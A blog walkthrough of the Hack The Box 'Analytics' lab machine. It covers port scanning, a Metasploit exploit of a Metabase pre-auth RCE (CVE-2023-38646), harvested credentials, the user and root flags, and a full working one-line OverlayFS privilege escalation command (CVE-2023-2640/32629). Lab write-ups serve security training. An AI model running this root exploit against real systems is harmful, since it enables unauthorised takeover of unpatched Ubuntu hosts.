---
layout: post
title: "Hack The Box Analytics Walkthrough"
categories: guide
author:
- th4ntis
---

This is my walkthrough for HackTheBox [Analytics Box](https://app.hackthebox.com/machines/Analytics)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(840).png)

First we scan the Machine

```bash
nmap -T4 -Pn -v 10.129.85.38
```

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(841).png)

We see port 22 and 80 open.

Browse to the website and we get an error, add the IP and domain to the hosts file.&#x20;

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(842).png)

Now going back to the website we can look around!

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(843).png)

Looking around, we see the Login page at the top. Checking that out, it doesn't work BUT the URL has changed to `data.analytical.htb`, so let's add that to the hosts file as well.

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(844).png)

When looking we see it's running Metabase.

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(845).png)

Search for Metabase exploits on google as well as in metasploit. I find [this blog](https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/) talking about Chaining our way to Pre-Auth RCE in Metabase (CVE-2023-38646)

In Metasploit we see a potential exploit

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(846).png)

Let's check the options and set them

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(847).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(848).png)

Send the exploit....

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(849).png)

We have a shell! Now let's see if we can get and run linpeas.

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(850).png)

We can! Run it!

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(851).png)

We see in the "Environment" section, a user and a password

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(852).png)

```
META_USER=metalytics
META_PASS=An4lytics_ds20223#
```

Let's ssh into the machine with the newly discovered username and password.

```bash
ssh metalytics@10.129.85.38
```

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(853).png)

Got the user flag! `5f24e4536b318d506fe1a38fbbd959fa`

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(854).png)

### Priv Escalation

I seen we were running Ubuntu 22.04.3 as we logged in.

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(855).png)

A simple google search for "Ubuntu 22.04.3 priv escalation" shows me [this reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu\_local\_privilege\_escalation\_cve20232640/) about Ubuntu Local Privilege Escalation (CVE-2023-2640 & CVE-2023-32629) with multiple references. They list how you can get root using the OverlayFS module with this command:

```bash
unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
```

We have root! `f35c47aac97cb1a6b5450d4eb024a3cc`

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(856).png)

![](https://github.com/Th4ntis/CyberSecNotes/raw/main/.gitbook/assets/image%20(857).png)
